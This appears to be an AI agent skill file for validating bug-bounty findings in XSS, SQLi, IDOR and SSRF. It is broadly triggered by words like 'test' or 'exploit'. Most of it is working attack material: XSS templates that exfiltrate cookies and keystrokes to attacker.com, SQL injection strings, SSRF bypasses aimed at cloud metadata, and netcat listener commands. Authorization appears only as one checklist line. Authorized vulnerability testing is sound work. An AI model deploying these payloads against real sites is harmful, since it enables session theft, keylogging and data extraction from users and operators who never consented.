---
name: bug-bounty-validate
description: >
  Vulnerability validation and exploitation verification skill. Confirms findings
  are real, exploitable, and generate real impact before reporting.
  Trigger: When user says "validate", "verify", "exploit", "confirm", " POC", "test", or needs to prove a vulnerability.
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

## When to Use

- User says "validate", "verify", "exploit", "confirm", "POC", "test", "verificar"
- After finding a potential vulnerability and before reporting
- Need to prove a vulnerability is real and exploitable
- Checking if a finding is a false positive
- Demonstrating business impact to a security team

## Critical Patterns

### Validation Methodology

**Step 1: Confirm the vulnerability exists**
```bash
# Always start with least invasive verification
# For XSS: Reflected payload in page source
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep -o "<script>"

# For SQLi: Boolean-based confirmation
curl -s "https://target.com/product?id=1'" | grep -iE "sql|syntax|mysql|error"

# For IDOR: Compare response with different user context
curl -H "Cookie: session=legit" https://target.com/api/data/123
curl -H "Cookie: session=other" https://target.com/api/data/123
```

**Step 2: Prove exploitability**
```bash
# For SSRF: Confirm callback to your server
# Start listener first
nc -lvnp 4444

# For XSS: Exfiltrate data proof
fetch('https://attacker.com?c='+btoa(document.cookie))

# For SQLi: Extract database version
curl -s "https://target.com/product?id=1+union+select+version()--"

# For IDOR: Verify with before/after comparison
```

**Step 3: Quantify impact**
```bash
# Count affected records
# For SQLi with data extraction: SELECT count(*) FROM users
# For IDOR: How many records accessible?
# For SSRF: Which internal services reachable?

# Determine blast radius
# Is it one user? All users? Entire database?
```

### Exploitation Proof Templates

#### XSS Exploitation
```javascript
// Cookie theft POC
<script>
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
</script>

// Keylogger POC
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?k=' + e.key);
  });
</script>

// Account takeover (if HttpOnly not set)
<script>
  document.location='https://attacker.com?cookie='+document.cookie;
</script>
```

#### SQLi Exploitation
```sql
-- Determine database type
' OR 1=1 -- (MySQL comment)
"; WAITFOR DELAY '00:00:05' -- (MSSQL time-based)
' AND 1=1 -- (PostgreSQL boolean-based)

-- Extract current user
' UNION SELECT current_user --

-- List tables
' UNION SELECT table_name FROM information_schema.tables --
```

#### IDOR Exploitation
```bash
# Verify with automated comparison
# User A accessing User B's resource
curl -b "session=user_a_session" https://target.com/api/resource/456
# Compare response with legitimate access from user B
curl -b "session=user_b_session" https://target.com/api/resource/456
# Should be different if IDOR exists
```

#### SSRF Exploitation
```bash
# Test with your own server
# Start: nc -lvnp 4444
# Payload: http://localhost:4444/internal-api
# Or: http://169.254.169.254/ (AWS metadata)

# Test for filter bypass
http://127.1/ (localhost alternative)
http://0/ (0.0.0.0 alternative)
http://[::1]/ (IPv6 localhost)
```

### Validation Checklist

- [ ] Vulnerability confirmed with at least 2 different test cases
- [ ] False positive ruled out (is this actually the vulnerability claimed?)
- [ ] Exploit successful (can you actually execute arbitrary action?)
- [ ] Impact quantified (what does this give an attacker?)
- [ ] Evidence captured (screenshots, HTTP logs, error messages)
- [ ] Duplication check done (is this a known issue?)
- [ ] Program scope verified (is this in-scope?)

### Severity Validation Matrix

| Vulnerability Type | Minimum Proof Required |
|-------------------|------------------------|
| XSS | Alert executed, cookie access demonstrated |
| SQLi | Data extracted or time-based blind confirmed |
| IDOR | Access to at least 2 different users' resources |
| SSRF | Callback to external server confirmed |
| RCE | Code execution confirmed (whoami, curl to your server) |
| Auth Bypass | Access to privileged endpoint without valid creds |
| CSRF | State-changing action executed without user consent |

### False Positive Red Flags

- **XSS**: Output is HTML-encoded, not interpreted as script
- **SQLi**: WAF blocks or input sanitized in query
- **IDOR**: Resource actually belongs to user (check ownership)
- **SSRF**: Filter blocks internal IPs, only external reachable
- **Auth Bypass**: Token correctly validated on backend

## Commands Reference

| Command | Purpose |
|---------|---------|
| `curl -v` | Verbose output to see full HTTP response |
| `nc -lvnp 4444` | Start listener for callbacks |
| `sqlmap -r request.txt --batch` | Automated SQLi validation |
| `commix --url="..."` | Command injection testing |
| `python3 -m http.server 8000` | Quick server for SSRF/XSS testing |

## Resources

- **Templates**: See [assets/](assets/) for POC templates by vulnerability type
- **Payloads**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **Burp Collaborator**: For out-of-band vulnerability confirmation
- **ZAP**: Automated vulnerability scanning and validation